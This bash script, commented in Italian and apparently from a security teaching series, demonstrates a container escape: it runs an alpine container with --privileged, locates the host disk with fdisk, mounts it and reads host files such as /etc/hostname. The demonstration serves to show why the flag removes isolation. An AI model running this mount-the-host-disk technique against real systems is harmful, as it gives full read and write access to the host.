#!/bin/bash
# 01_privileged_escape.sh — Container escape via --privileged flag
#
# Dimostra che un container "privilegiato" puo' montare il filesystem
# dell'host e leggere/scrivere qualsiasi file. Trenta secondi.
#
# Uso:
#     chmod +x 01_privileged_escape.sh
#     ./01_privileged_escape.sh

set -e

SEP="============================================================"

echo ""
echo "$SEP"
echo "  STEP 1: Container normale — cosa NON puoi fare"
echo "$SEP"
echo ""
echo "> Proviamo a listare i dischi da un container normale..."
echo ""

docker run --rm alpine sh -c '
    echo "--- fdisk -l (container normale) ---"
    fdisk -l 2>&1 || echo "BLOCCATO: fdisk non ha permessi"
    echo ""
    echo "--- ls /dev/sda* ---"
    ls /dev/sda* 2>&1 || echo "BLOCCATO: /dev/sda non esiste nel container"
'

echo ""
echo "$SEP"
echo "  STEP 2: Container privilegiato — game over"
echo "$SEP"
echo ""
echo "> Stesso container, ma con --privileged..."
echo ""

docker run --rm --privileged alpine sh -c '
    echo "--- fdisk -l (container privilegiato) ---"
    fdisk -l 2>/dev/null | head -20
    echo ""
    echo "[*] Trovato il disco host. Lo monto..."
    mkdir -p /mnt/host
    DISK=$(fdisk -l 2>/dev/null | grep "^Disk /dev/" | grep -v loop | head -1 | cut -d: -f1 | cut -d" " -f2)
    if [ -n "$DISK" ]; then
        # Su Docker Desktop Mac, il disco e'"'"' /dev/sda o /dev/vda
        # Proviamo le partizioni comuni
        for part in "${DISK}1" "${DISK}2" "${DISK}" "/dev/sda1" "/dev/vda1"; do
            if mount "$part" /mnt/host 2>/dev/null; then
                echo "[+] Montato $part su /mnt/host"
                break
            fi
        done
    fi

    if mountpoint -q /mnt/host 2>/dev/null; then
        echo ""
        echo "--- File dell'"'"'host (/) ---"
        ls /mnt/host/ 2>/dev/null | head -20
        echo ""
        echo "--- /etc/hostname dell'"'"'host ---"
        cat /mnt/host/etc/hostname 2>/dev/null || echo "(non trovato)"
        echo ""
        echo "--- /etc/os-release dell'"'"'host ---"
        cat /mnt/host/etc/os-release 2>/dev/null | head -5
        echo ""
        echo "[!] ESCAPE RIUSCITO: puoi leggere e scrivere qualsiasi file dell'"'"'host."
        echo "[!] Su Docker Desktop Mac, l'"'"'host e'"'"' la VM LinuxKit, non macOS direttamente."
        echo "[!] Ma se fosse un server Linux in produzione, saresti root sul sistema."
    else
        echo "[-] Mount fallito, ma il concetto resta: --privileged rimuove ogni isolamento."
    fi
'

echo ""
echo "$SEP"
echo "  RISULTATO"
echo "$SEP"
echo ""
echo "Un flag. --privileged. E il container non e' piu' isolato."
echo ""
